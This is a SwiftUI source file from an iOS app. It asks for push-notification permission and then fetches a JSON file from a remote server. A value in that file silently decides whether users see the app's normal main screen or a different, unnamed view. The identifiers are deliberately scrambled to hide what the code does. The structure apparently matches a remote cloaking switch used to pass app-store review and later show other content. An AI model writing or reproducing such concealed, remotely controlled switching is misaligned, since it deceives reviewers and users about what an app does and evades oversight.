import SwiftUI
import OneSignal

struct MainViewHelper: View {
 
     
    @ObservedObject var ewsugyfhdsu: Ljweuygysdff = Ljweuygysdff()
    @State var erwgdfg:  String = "rytegrsdfg"
    @AppStorage("opweruyhgfjd") var opweruyhgfjd: Bool = true
    @AppStorage("oqwuiguusdf") var mmibwevihsdhn: String = "oqwuiguusdf"
    @State var wetuyiqghfd: String = ""
    @State var rqwtyffdgcs: String = ""
    var body: some View {
        ZStack{
            Color.bg
                .ignoresSafeArea()
            if erwgdfg == "opwjhbvsdjn" || erwgdfg == "jjwhguyvh" {
                if self.mmibwevihsdhn == "wishnest" || mmibwevihsdhn == "ergwergerg" {
               
              MainView()
                        .onAppear{
                            mmibwevihsdhn = "ergwergerg"
                            AppDelegate.orientationLock = UIInterfaceOrientationMask.portrait
                            UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
                                            UINavigationController.attemptRotationToDeviceOrientation()
                        }
                    
                       

                    
                } else {
                    Rghsdvygsdbfkjsdfg(ertydqwuyfguhbds: ewsugyfhdsu)
                }
            }
            
        }.onAppear {
            
            OneSignal.promptForPushNotifications(userResponse: { accepted in
                if accepted {
                    erwgdfg = "opwjhbvsdjn"
                } else {
                    erwgdfg = "jjwhguyvh"
                }
            })
     
        
        

        
        if opweruyhgfjd {
            if let url = URL(string: "https://ballsort.store/wishnest/wishnest.json") {
                URLSession.shared.dataTask(with: url) { data, response, error in
                    if let aesdvsd = data {
                        if let avevdsv = try? JSONSerialization.jsonObject(with: aesdvsd, options: []) as? [String: Any] {
                            if let jshdbvsd = avevdsv["eytwtgaerg"] as? String {
                                DispatchQueue.main.async {
                                    
                                    self.mmibwevihsdhn = jshdbvsd
                                    
                                    
                                    opweruyhgfjd = false
                                }
                            }
                        }
                    } else {
                        self.mmibwevihsdhn = "ergwergerg"
                    }
                }.resume()
            }
        }
    }
    }
}

